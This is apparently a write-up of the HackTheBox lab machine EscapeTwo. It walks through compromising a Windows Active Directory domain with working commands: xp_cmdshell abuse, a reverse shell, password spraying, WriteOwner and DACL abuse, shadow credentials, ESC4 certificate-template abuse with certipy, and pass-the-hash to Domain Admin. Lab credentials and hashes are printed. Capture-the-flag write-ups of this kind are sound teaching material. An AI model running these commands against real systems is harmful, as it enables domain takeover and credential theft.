---
title: "HackTheBox - EscapeTwo"
date: 2025-05-22
draft: false
series: "HTB Machines"
tags: ["active directory", "hackthebox", "windows"]
---

# EscapeTwo Walkthrough
In the machine description, we have credentials to start the machine, `rose` and `KxEPkKe6R8su`.

---


## 1. Enumeration
### 1.1 NMAP
As usual, let’s start by checking the open ports on the machine

<!-- ----
> TESTE

- TESTE2

~~strikethrough~~

`TESTE3`

---- -->

```bash
nmap -p- --open -T4 10.10.11.51 -Pn -oA nmap-out
```
**Key findings:**

![nmap](/images/escapetwo-nmap.png)

### 1.2  SMB Shares
Enumerating SMB with smbclient and `rose` credentials:

![smb enum](/images/escapetwo-smb.png)

> **Finding:** `Users` and `Accounting Department` shares.

By checking the `Accounting Department` share, we can see two `.xlsx` files. Let’s download them and check their content.

![smb enum](/images/escapetwo-smb1.png)

Inside `accounts.xlsx -> xl -> sharedStrings.xml` we can find some credentials. Let’s take note of them and move on
![sharedStrings](/images/escapetwo-sharedStrings.png)
![creds](/images/escapetwo-creds.png)

> Finding 1: `angela / 0fwz7Q4mSpurIt99`

> Finding 2: `oscar / 86LxLBMgEWaKUnBG`

> Finding 3: `kevin / Md9Wlq1E5bZnVDVo`

> Finding 4: `sa / MSSQLP@ssw0rd!`


In general, `sa` is the common admin user for MSSQL databases. Let’s try to explore this first using Impacket’s mssqlclient script.

### 1.3 MSSQL Service
![mssql](/images/escapetwo-mssql.png)

> Great, now we are db admin.

By default, xp_cmdshell is disabled in MSSQL, let's enable it.

```bash
enable_xp_cmdshell
```
![enable cmdshell](/images/escapetwo-enablecmd.png)

To obtain more data, we can check default files from MSSQL deployment:

```bash
exec xp_cmdshell 'type \SQL2019\ExpressAdv_ENU\sql-Configuration.INI'
```

![new creds](/images/escapetwo-newcreds.png)

> **Finding:** New credential, `SEQUEL\sql_svc / WqSZAF6CysDQbGb3`

----

## 2. Shell as sql_svc
Since we can execute commands with the SQL service, we can try a PowerShell reverse shell. We can generate it using [RevShell Generator](https://www.revshells.com/).

### 2.1 Powershell Payload - Base64 encoded

![revshell](/images/escapetwo-revshell.png)

### 2.2 Receiving connection
![revshell1](/images/escapetwo-revshell1.png)

> **Now we are inside the box!**

---

## 3. Lateral Movement
Looking for some users at `C:/Users/` that have logged into the machine we can see just `ryan` as a possible next goal. Let's try a password spray with all the credentials that we've got.

### 3.1 Password spray
Putting all the previous password on a file called passwords.txt, let's start the attack with netexec.

![password spray](/images/escapeTwo-passwordSpray.png)

> **Finding:** New valid credential for `ryan` user.

### 3.1 Evil-winrm with `ryan`
Let's try a shell with `ryan` user.

![shell as ryan](/images/escapetwo-ryanshell.png)

> **Great, we succesfull did a lateral movement!**
----

## 4. Privillege Escalation
### 4.1 BloodHound
Let's get some information with Bloodhound and analyse it.

```bash
bloodhound-python -u ryan -p "WqSZAF6CysDQbGb3" -d sequel.htb -ns 10.10.11.51 -c All
```

![bloodhound](/images/escapetwo-bloodhound.png)

### 4.2 WriteOwner Abuse
By analysing the results, we can se that use `ryan` has `WriteOwner` rights on `ca_svc` object, this can result in a full control of that object. Let's explore this.

![abuse writeowner](/images/escapetwo-abuseOwner.png)

Grant ourselves ownership of the object in AD:

```bash
bloodyAD --host '10.10.11.51' -d 'sequel.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'
```

Give ourselves FullControl over the ca_svc user, allowing us to add a shadow credential on next step:

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' '10.10.11.51'/"ryan":"WqSZAF6CysDQbGb3"
```

![abuse owner](/images/escapetwo-abuseOwner1.png)

Now we can add a shadow credential:

```bash
certipy-ad shadow auto -u ryan@sequel.htb -p WqSZAF6CysDQbGb3 -account 'ca_svc' -dc-ip 10.10.11.51  
```

![shadow cred](/images/escapetwo-shadowCreds.png)

### 4.3 Enumerating ADCS Vulnerabilities
We can use certipy-ad tool to enumerate possible vulnerabilities in ADCS.
```bash
certipy-ad find -u 'ca_svc' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip '10.10.11.51' -vulnerable
```
![enum-adcs](/images/escapetwo-enum-adcs.png)

> **Vulnerable to ESC4!**

### 4.4 ESC4 Abuse
ESC4 (ESCalation 4) refers to a privilege escalation path where an attacker abuses the ability to manage certificate templates in an ADCS environment. Specifically, the attacker has permissions like WriteOwner, WriteDacl, WriteProperty, or AllExtendedRights over a certificate template object.

By modifying the template's settings, the attacker can make it vulnerable, then request a certificate to impersonate privileged users, such as Domain Admins or Enterprise Admins.

Using `certipy-ad`to exploit it:

 We have to do this very quickly due to the error *CERTSRV_E_SUBJECT_DNS_REQUIRED - The Domain Name System (DNS) name is unavailable and cannot be added to the Subject Alternate name*

Cause ca_svc has full control over the template we'll make it vulnerable to ESC1 at first.

```bash
certipy-ad template -u 'ca_svc' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip '10.10.11.51' -template 'DunderMifflinAuthentication' -write-default-configuration -no-save
```

![esc4-pt1](/images/escapetwo-esc4-1.png)

Now, I can request for a domain administrator certificate using the modified template:

```bash
certipy-ad req -u ca_svc@sequel.htb -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -template DunderMifflinAuthentication -upn administrator@sequel.htb
```

![esc4-pt2](/images/escapetwo-esc4-2.png)


With the certificate, we can retrieve the NTLM hash for the account:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.51
```
![esc4-pt3](/images/escapetwo-esc4-3.png)

### 4.5 Shell as Domain Admin
Now, just evil-winrm with the new hash.

```bash
evil-winrm -u 'administrator' -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i 10.10.11.51 
```

![esc4-pt2](/images/escapetwo-domainadmin.png)